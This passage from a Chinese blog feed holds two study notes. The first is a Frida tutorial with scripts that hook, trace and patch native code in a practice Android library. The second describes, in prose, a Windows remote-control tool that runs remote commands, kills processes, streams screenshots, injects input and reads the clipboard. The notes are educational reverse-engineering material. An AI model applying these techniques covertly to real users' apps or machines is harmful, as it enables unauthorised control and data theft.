class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印基址</span></span><br><span class="line">        <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">        <span class="keyword">var</span> funcaddr = soAddr.<span class="title function_">add</span>(<span class="number">0x1071C</span>);  </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(funcaddr);</span><br><span class="line">        <span class="keyword">if</span>(funcaddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcaddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args参数</span></span><br><span class="line"></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(retval.<span class="title function_">toInt32</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>函数地址计算</strong>？？？？？？？？？？？？？？？？？？？</p><ol><li>安卓里一般32 位的 so 中都是<code>thumb</code>指令，64 位的 so 中都是<code>arm</code>指令</li><li>通过IDA里的opcode bytes来判断，arm 指令为 4 个字节(options -&gt; general -&gt; Number of opcode bytes (non-graph) 输入4)</li><li>thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 + 1<br> arm 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移</li></ol><h3 id="Hook-dlopen"><a href="#Hook-dlopen" class="headerlink" title="Hook_dlopen"></a>Hook_dlopen</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> so_name = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span> (so_name.<span class="title function_">indexOf</span>(<span class="string">&quot;lib52pojie.so&quot;</span>) &gt;= <span class="number">0</span>) <span class="variable language_">this</span>.<span class="property">call_hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">call_hook</span>) <span class="title function_">hookTest2</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 高版本Android系统使用android_dlopen_ext</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> so_name = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span> (so_name.<span class="title function_">indexOf</span>(<span class="string">&quot;lib52pojie.so&quot;</span>) &gt;= <span class="number">0</span>) <span class="variable language_">this</span>.<span class="property">call_hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">call_hook</span>) <span class="title function_">hookTest2</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-写数据"><a href="#Frida-写数据" class="headerlink" title="Frida 写数据"></a>Frida 写数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般写在app的私有目录里，不然会报错:failed to open file (Permission denied)(实际上就是权限不足)</span></span><br><span class="line"><span class="keyword">var</span> file_path = <span class="string">&quot;/data/user/0/com.zj.wuaipojie/test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file_handle = <span class="keyword">new</span> <span class="title class_">File</span>(file_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="literal">null</span>) &#123;</span><br><span class="line">        file_handle.<span class="title function_">write</span>(data); <span class="comment">//写入数据</span></span><br><span class="line">        file_handle.<span class="title function_">flush</span>(); <span class="comment">//刷新</span></span><br><span class="line">        file_handle.<span class="title function_">close</span>(); <span class="comment">//关闭</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-inlineHook与读写汇编"><a href="#Frida-inlineHook与读写汇编" class="headerlink" title="Frida_inlineHook与读写汇编"></a>Frida_inlineHook与读写汇编</h3><p>什么是inlinehook？<br>Inline hook（内联钩子）是一种在程序运行时修改函数执行流程的技术。<strong>它通过修改函数的原始代码，将目标函数的执行路径重定向到自定义的代码段，从而实现对目标函数的拦截和修改。</strong><br>简单来说就是可以对任意地址的指令进行hook读写操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">inline_hook</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (soAddr) &#123;</span><br><span class="line">        <span class="keyword">var</span> func_addr = soAddr.<span class="title function_">add</span>(<span class="number">0x10428</span>);</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x22</span>); <span class="comment">//注意此时就没有args概念了</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x22</span> = <span class="title function_">ptr</span>(<span class="number">1</span>); <span class="comment">//赋值方法参考上一节课</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将地址的指令解析成汇编</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> codeAddr = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(soAddr.<span class="title function_">add</span>(<span class="number">0x10428</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(codeAddr.<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p>Frida Api arm转hex</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> codeAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x10428</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(codeAddr, <span class="number">4</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: codeAddr &#125;);</span><br><span class="line">writer.<span class="title function_">putBytes</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;20008052&quot;</span>));</span><br><span class="line">writer.<span class="title function_">flush</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">len /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="普通函数与jni函数的主动调用"><a href="#普通函数与jni函数的主动调用" class="headerlink" title="普通函数与jni函数的主动调用"></a>普通函数与jni函数的主动调用</h3><table><thead><tr><th align="left">数据类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">void</td><td align="left">无返回值</td></tr><tr><td align="left">pointer</td><td align="left">指针</td></tr><tr><td align="left">int</td><td align="left">整数</td></tr><tr><td align="left">long</td><td align="left">长整数</td></tr><tr><td align="left">char</td><td align="left">字符</td></tr><tr><td align="left">float</td><td align="left">浮点数</td></tr><tr><td align="left">double</td><td align="left">双精度浮点数</td></tr><tr><td align="left">bool</td><td align="left">布尔值</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1054C</span>);</span><br><span class="line"><span class="comment">//声明函数指针</span></span><br><span class="line"><span class="comment">//NativeFunction的第一个参数是地址，第二个参数是返回值类型，第三个[]里的是传入的参数类型(有几个就填几个)</span></span><br><span class="line"><span class="keyword">var</span> aesAddr = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(funcAddr , <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> encry_text = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;OOmGYpk6s0qPSXEPp4X31g==&quot;</span>);    <span class="comment">//开辟一个指针存放字符串       </span></span><br><span class="line"><span class="keyword">var</span> key = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&#x27;wuaipojie0123456&#x27;</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">aesAddr</span>(encry_text ,key).<span class="title function_">readCString</span>());</span><br></pre></td></tr></table></figure><p>jni的主动调用<br>参考java的主动调用，简单快捷</p><h3 id="frida-trace"><a href="#frida-trace" class="headerlink" title="frida-trace"></a>frida-trace</h3><p>frida-trace 可以一次性监控一堆函数地址。还能打印出比较漂亮的树状图，不仅可以显示调用流程，还能显示调用层次。并且贴心的把不同线程调用结果用不同的颜色区分开了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">D:\&gt; frida-trace.exe --<span class="built_in">help</span>  </span><br><span class="line">用法: frida-trace [options] target</span><br><span class="line"></span><br><span class="line">位置参数:  </span><br><span class="line">   args                  extra arguments and/or target</span><br><span class="line"></span><br><span class="line">选项:  </span><br><span class="line">  -h, --<span class="built_in">help</span>               显示帮助  </span><br><span class="line">  -D ID, --device ID       通过 ID 连接设备  </span><br><span class="line">  -U, --usb                通过 USB 连接设备  </span><br><span class="line">  -R, --remote             连接到远程 frida-server  </span><br><span class="line">  -H HOST, --host HOST     连接到远程 host 上的 frida-server  </span><br><span class="line">  --certificate 证书       设置证书，通过 TSL 与 host 交互                          </span><br><span class="line">  --origin ORIGIN          设置连接到远程服务的 <span class="string">&quot;Origin&quot;</span> 头部  </span><br><span class="line">  --token TOKEN            设置 与host 认证  </span><br><span class="line">  --keepalive-interval     时间间隔。0表示禁用，-1表示基于传输自动选择                          </span><br><span class="line">  --p2p                    建立一个点对点的连接  </span><br><span class="line">  --stun-server ADDRESS    设置--p2p 的 STUN 服务地址  </span><br><span class="line">  --relay address,username,password,turn-&#123;udp,tcp,tls&#125;  添加--p2p 延迟  </span><br><span class="line">  -f TARGET, --file TARGET       spawn 模式  </span><br><span class="line">  -F, --attach-frontmost         附加到最前端的 application  </span><br><span class="line">  -n NAME, --attach-name NAME    附加到一个名字                          </span><br><span class="line">  -N IDENTIFIER, --attach-identifier IDENTIFIER   附加到标识符                          </span><br><span class="line">  -p PID, --attach-pid PID        附加到 pid                          </span><br><span class="line">  -W PATTERN, --await PATTERN  </span><br><span class="line">                        await spawn matching PATTERN  </span><br><span class="line">  --stdio &#123;inherit,pipe&#125;  </span><br><span class="line">                        stdio behavior when spawning (defaults to “inherit”)  </span><br><span class="line">  --aux option          <span class="built_in">set</span> aux option when spawning, such as “uid=(int)42” (supported types are:  </span><br><span class="line">                        string, bool, int)  </span><br><span class="line">  --realm &#123;native,emulated&#125;            附件的范围  </span><br><span class="line">  --runtime &#123;qjs,v8&#125;                   使用的脚本运行环境  </span><br><span class="line">  --debug                              启用 Node.js 兼容的脚本调试器  </span><br><span class="line">  --squelch-crash                      如果启用，将不会将崩溃报告转储到控制台  </span><br><span class="line">  -O FILE, --options-file FILE         将信息保存到文件中</span><br><span class="line">  --version                            显示版本号</span><br></pre></td></tr></table></figure><ul><li><code>-i</code> &#x2F; <code>-a</code>: 跟踪 C 函数或 so 库中的函数。<br>  PS:-a 包含模块+偏移跟踪，一般用于追踪未导出函数，例子：-a “lib52pojie.so!0x4793c”</li></ul><p>包含&#x2F;排除模块或函数：</p><ul><li><code>-I</code> : 包含指定模块。</li><li><code>-X</code> : 排除指定模块。</li></ul><p>Java 方法跟踪：</p><ul><li><code>-j JAVA_METHOD</code>: 包含 Java 方法。</li><li><code>-J JAVA_METHOD</code>: 排除 Java 方法。</li></ul><p>附加方式:</p><ul><li><code>-f</code>:通过 spwan 方式启动</li><li><code>-F</code>:通过 attach 方式附加当前进程</li></ul><p>日志输出:<br><code>-o</code>:日志输出到文件</p><p>使用案例：<br>frida-trace -U -F -I “lib52pojie.so” -i “Java_” #附加当前进程并追踪lib52pojie.so里的所有Java_开头的jni导出函数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Frida&quot;&gt;&lt;a href=&quot;#Frida&quot; class=&quot;headerlink&quot; title=&quot;Frida&quot;&gt;&lt;/a&gt;Frida&lt;/h1&gt;&lt;p&gt;总体来自吾爱破解-正己的Frida篇教程&lt;/p&gt;
&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;</summary>
      
    
    
    
    <category term="Android" scheme="https://qianmuoy.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>使用WindowsAPI在Ring3进行系统操作</title>
    <link href="https://qianmuoy.github.io/2024/03/18/%E4%BD%BF%E7%94%A8WindowsAPI%E5%9C%A8Ring3%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"/>
    <id>https://qianmuoy.github.io/2024/03/18/%E4%BD%BF%E7%94%A8WindowsAPI%E5%9C%A8Ring3%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/</id>
    <published>2024-03-18T14:23:36.000Z</published>
    <updated>2024-03-18T14:23:57.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Windows-API在Ring3对系统进行操作"><a href="#使用Windows-API在Ring3对系统进行操作" class="headerlink" title="使用Windows API在Ring3对系统进行操作"></a>使用Windows API在Ring3对系统进行操作</h1><h1 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h1><p>使用管道通信</p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibrary(“Cmd.dll”);</li><li>GetProcAddress 获取下述各种函数地址</li><li>SetPipeCommunication开启管道通信</li><li>启动cmd.exe，SetPipeData发送服务端的数据</li><li>启动线程，GetPipeData获取管道内的数据（cmd返回的），向服务端发送</li><li>析构时UnsetPipeCommunication释放管道</li></ol><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>接受到客户端返回的东西然后展示</p><p>用户输入要在客户端cmd运行的东西，发送出去（IOCP）</p><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><ol><li>capGetDriverDescription获取打印机、摄像头等外部设备信息</li><li>RegOpenKey打开注册表键句柄，RegQueryValueEx传入句柄和要查的键string获取值</li><li>上述方法查到进程信息，在HARDWARE\DESCRIPTION\System\CentralProcessor\0，ProcessorNameString</li><li>发送到服务端</li></ol><h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><p>拿到信息设置进数据结构里面</p><h1 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h1><h2 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibrary(“Service.dll”);</li><li>SeEnumServiceList枚举服务信息，自己遍历一下放进BufferData，发送到服务端</li><li>接受服务端发过来的Method，ServiceName，调用SeCofigService设置服务信息。重复步骤2.</li></ol><h2 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h2><ol><li><p>LoadLibrary(“Service.dll”)；获取SeEnumServiceList地址</p></li><li><p>解析客户端发过来的Buffer，展示信息。调用SeEnumServiceList展示本机的服务信息</p></li><li><p>客户端信息有：<br> “服务名称”,<br> “显示名称”,<br> “启动类型”,<br> “运行状态”,<br> “可执行文件路径”<br> “服务名称”,<br> “显示名称”,<br> “启动类型”,<br> “运行状态”,<br> “可执行文件路径”<br> 本地信息有：”真实名称”,<br> “显示名称”,<br> “启动类型”,<br> “运行状态”,<br> “可执行文件路径”</p></li><li><p>根据选择给客户端发操作。<br> Method：<br> 1 启动<br> 2 停止<br> 3 自启动<br> 4 手动启动</p></li></ol><h1 id="即时消息"><a href="#即时消息" class="headerlink" title="即时消息"></a>即时消息</h1><h2 id="客户端-3"><a href="#客户端-3" class="headerlink" title="客户端"></a>客户端</h2><ol><li>#pragma comment(lib, “WINMM.LIB”) 时钟回调，其实是实现展示一下以后就关闭。消息到了响一下铃声</li><li>消息来了设置事务，然后展示到窗口</li></ol><h2 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h2><ol><li>获取编辑框里面的数据，检测到回车就发出去</li></ol><h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="客户端-4"><a href="#客户端-4" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibrary(“File.dll”);</li><li>GetLocalHardDiskInfo获取磁盘信息</li><li>GetLocalFileList获取文件信息</li><li>解析一下，发到服务端去</li></ol><h2 id="服务端-4"><a href="#服务端-4" class="headerlink" title="服务端"></a>服务端</h2><ol><li>CreateFileA通过DiskVolumeName打开卷句柄，通过DeviceIOControl传递FSCTL_QUERY_USN_JOURNAL得到UNS<br> USN是Update Service Number Journal or Change Journal的英文缩写，直译为“更新序列号”，是对NTFS卷里所修改过的信息进行相关记录的功能。当年微软发布Windows 2000时，建立NTFS 5.0的同时，加入了一些新功能和改进了旧版本的文件系统，为它请来了一位可靠的秘书，<strong>它可以在分区中设置监视更改的文件和目录的数量，记录下监视对象修改时间和修改内容</strong>。没错，它就是USN日志。当这个功能启用时，对于每一个NTFS卷，当发生有关添加、删除和修改文件的信息时，NTFS都使用USN日志记录下来。</li><li>再发FSCTL_ENUM_USN_DATA遍历记录，展示</li><li>监视UNS，维护数据结构</li><li>LoadLibrary(“File.dll”); GetLocalHardDiskInfo展示服务端的信息</li><li>展示信息包括<br> “名称”,<br> “显示名称”<br> “文件系统”<br> “类型”,<br> “总大小”,<br> “可用空间”</li><li>发送到客户端重新请求文件信息（我好像没找到操作客户端的函数）</li></ol><h1 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h1><h2 id="客户端-5"><a href="#客户端-5" class="headerlink" title="客户端"></a>客户端</h2><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ol><li>LoadLibrary(“Process.dll”);</li><li>GetProcAddress获取SeEnumProcessList，遍历进程信息。解析以后发到服务端</li><li>接收消息，调用Ring3KillProcess杀进程。</li></ol><h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><ol><li>LoadLibrary(“Window.dll”);（这尼玛也有对应的dll，跪了。。）</li><li>GetProcAddress获取下述函数地址</li><li>GetWindowList获取打开的窗口信息，解析一下发服务端</li><li>接收消息，调用SetWindowStatus设置窗口状态(最小化等)，调用PostWindowMessage向窗口发信息(关闭等)</li></ol><h2 id="服务端-5"><a href="#服务端-5" class="headerlink" title="服务端"></a>服务端</h2><h3 id="进程管理-1"><a href="#进程管理-1" class="headerlink" title="进程管理"></a>进程管理</h3><ol><li>LoadLibrary(“Process.dll”);，SeEnumProcessList，Ring3KillProcess，查看和操作本机的进程。</li><li>Wow64EnableWow64FsRedirection 禁止文件重定向</li><li>展示客户端的进程信息</li><li>客户点击杀进程，发消息给客户端，或者对本地操作</li><li>点击了获取进程模块信息，调用<code>OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,ProcessID)</code>获取信息，并开一个新窗口展示</li></ol><h3 id="进程模块管理"><a href="#进程模块管理" class="headerlink" title="进程模块管理"></a>进程模块管理</h3><ol><li>GetModuleHandle(“Process.dll”);（这说明这个dll已经被导入，直接获取句柄。LoadLibrary会重新映射进内存并增加引用计数）</li><li>GetProcAddress拿到SeEnumProcessModuleList，传进PID即可获取到所有模块信息，解析以后放上窗口。包括：<br> “模块地址”,<br> “模块大小”,<br> “模块完整路径”,<br> “模块类型”,</li></ol><h3 id="窗口管理-1"><a href="#窗口管理-1" class="headerlink" title="窗口管理"></a>窗口管理</h3><ol><li>LoadLibrary(“Window.dll”); 下述函数地址都GetProcAddress而来</li><li>展示客户端和本机的消息，内容有:”窗口句柄”,<br> “窗口名称”,<br> “窗口类名称<br> “窗口状态”,<br> “启用&#x2F;禁用”<br> “线程ID”,<br> “进程ID”,<br> “占位”</li><li>GetWindowList，SetWindowStatus，PostWindowMessage操作本机，或给客户端发消息操作客户端</li><li>RestartForbidWindow重启被禁用的窗口</li><li>FixWindowTitleBar重设窗口标题</li></ol><h1 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h1><h2 id="客户端-6"><a href="#客户端-6" class="headerlink" title="客户端"></a>客户端</h2><ol><li>开线程，设置线程回调</li><li>线程回调中向服务端发送bmp位图</li><li>发送第一张截图</li><li>一直发送下一张截图</li><li>接受服务端消息，发送给位图。调用BlockInput可以锁上鼠标键盘等待消息，或解锁进行操作。</li><li>解析发来的数据，调用SetCursorPos移动鼠标，SetCapture设置画面，mouse_event和keybd_event传递键盘鼠标事件。</li><li>GetClipboardData获取剪切板发给服务端，SetClipboardData根据消息设置剪切板</li></ol><p>以上靠&lt;Windows.h&gt;（WinUser.h）提供的API实现。位图操作如下</p><ol><li>GetSystemMetrics获取屏幕分辨率</li><li>构建BITMAPINFOHEADER位图结构体</li><li>GetDesktopWindow获取屏幕句柄。GetDC获取屏幕DC。<br> 设备描述表（DC）是Windows中的一种数据结构，它包含GDI需要的所有关于显示界面情况的描述字段，包括相连的物理设备和各种各样的状态信息。在Windows画图之前，Windows程序从GDI获取设备描述表句柄（HDC），并在每次调用完GDI输出函数后将句柄返回给GDI。屏幕上的每一个窗口都对应一个DC，可以把DC想象成一个视频缓冲区，对这这个缓冲区的操作，会表现在这个缓冲区对应的屏幕窗口上。</li><li>CreateCompatibleDC创建设备上下文，CreateDIBSection把信息分配进位图里</li><li>截图位于m_BitmapInfo-&gt;bmiHeader.biSizeImage</li><li>光标调用GetCursorPos传入POINT结构</li><li>每次分段扫描全屏幕，调用BitBlt传入DC句柄，新的位图和旧的按结构作比较，如果不同就修改，然后返回新的位图</li></ol><h2 id="服务端-6"><a href="#服务端-6" class="headerlink" title="服务端"></a>服务端</h2><ol><li>根据句柄CreateCompatibleDC获取DC，CreateDIBSection把信息分配进位图里，SelectObject择一对象到指定的设备上下文环境，SetScrollRange指定滚动条范围的最小值和最大值</li><li>得到被控端发来的数据 ，将他memcpy拷贝到HBITMAP的缓冲区中，这样一个图像就出现了</li><li>后续更新一下变化部分的屏幕数据然后BitBlt、DrawIconEx重绘，memcmp比较鼠标位置，根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁</li><li>汇编实现的代码控制ESI指向的数据（我看不懂了）</li><li>根据枚举类型，判断要做的操作。要获取客户端剪切板，需要一直获取，所以提交到完成端口队列。同样把自己的剪切板也要一变化就发到客户端去。</li><li>还用了内存池来管理。详见浅析nginx内存池</li></ol><h1 